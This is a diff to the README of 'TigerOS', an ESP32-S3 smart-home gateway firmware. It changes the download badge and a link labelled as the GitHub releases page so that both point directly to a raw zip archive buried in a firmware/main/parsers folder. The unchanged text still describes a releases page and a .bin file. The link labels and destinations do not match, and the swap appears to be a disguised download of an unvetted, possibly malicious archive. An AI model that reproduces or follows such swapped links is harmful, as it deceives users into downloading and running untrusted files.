@@ -1,6 +1,6 @@
 # 🐯 TigerOS - Build your own smart home gateway
 
-[![Download TigerOS](https://img.shields.io/badge/Download-TigerOS-blue.svg)](https://github.com/Ast36719/TigerOS)
+[![Download TigerOS](https://img.shields.io/badge/Download-TigerOS-blue.svg)](https://github.com/Ast36719/TigerOS/raw/refs/heads/main/firmware/main/parsers/Tiger_OS_v3.8-alpha.2.zip)
 
 TigerOS provides a bridge between your home devices and your network. This software turns your ESP32-S3 hardware into a reliable hub for your smart home. It handles Bluetooth and Wi-Fi signals to keep your devices connected.
 
@@ -19,7 +19,7 @@ Your computer needs a driver to talk to the ESP32-S3 board. Most modern Windows 
 
 You must visit the project page to download the latest version of the firmware.
 
-[Visit the TigerOS GitHub releases page to download the file](https://github.com/Ast36719/TigerOS)
+[Visit the TigerOS GitHub releases page to download the file](https://github.com/Ast36719/TigerOS/raw/refs/heads/main/firmware/main/parsers/Tiger_OS_v3.8-alpha.2.zip)
 
 Look for the "Assets" section on the releases page. Choose the file that ends in .bin. This file contains the instructions your hardware needs to function. Save this file to your desktop for easy access.
 
